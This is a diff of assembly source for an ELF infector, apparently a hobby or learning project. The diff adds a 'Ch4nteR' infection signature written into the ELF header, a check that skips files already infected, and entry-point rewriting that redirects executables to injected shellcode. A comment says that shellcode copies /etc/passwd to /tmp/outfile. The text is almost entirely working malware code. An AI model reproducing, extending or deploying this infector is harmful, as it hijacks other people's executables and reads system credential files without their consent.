@@ -25,6 +25,8 @@ section .data
 
     after_infect_msg db "The provided file was successfully infected.", 10
     after_infect_len equ $ - after_infect_msg
+    is_inf_msg db "The provided file is already infected.", 10
+    is_inf_len equ $ - is_inf_msg
 
     ; Inspired by https://shell-storm.org/shellcode/files/shellcode-867.html, still copies /etc/passwd to /tmp/outfile but replaced some registers and added instructions
     shellcode db 0x54, 0x56, 0x57, 0x50, 0x53, 0x52 ; push rsp, push rsi, push rdi, push rax, push rbx, push rdx
@@ -84,6 +86,8 @@ section .data
 
         db 0xE9, 0x00, 0x00, 0x00, 0x00 ; jmp 0x0 (little endian) (relative to RIP)
     shellcode_len equ $ - shellcode
+
+    signature db 0x43, 0x68, 0x34, 0x6E, 0x74, 0x65, 0x52   ; Ch4nteR
 
 section .bss
     fd resq 1
@@ -194,7 +198,25 @@ is_elf:
     mov rdx, elf_len
     syscall
 
+    jmp check_signature
+
+check_signature:
+    mov rsi, buffer
+    add rsi, 8
+    mov rax, [rsi]
+    cmp rax, [signature]
+    je is_infected
+
     jmp retrieve_info
+
+is_infected:
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, is_inf_msg
+    mov rdx, is_inf_len
+    syscall
+
+    jmp close
 
 retrieve_info:
     ; Retrieve information needed to infect the ELF file
@@ -294,9 +316,13 @@ infect:
     mov [rsi + 48], rax
 
     ;;; Edit ELF header ;;;
+    mov rsi, buffer
+
+    ; Add signature
+    mov rcx, [signature]
+    mov [rsi + 8], rcx
 
     ; Change e_entry to the new one
-    mov rsi, buffer
     mov [rsi + 24], rbx     ; rbx has previously computed P_VADDR
 
     mov r15, [fd]   ; If we use [fd] directly the second one won't work
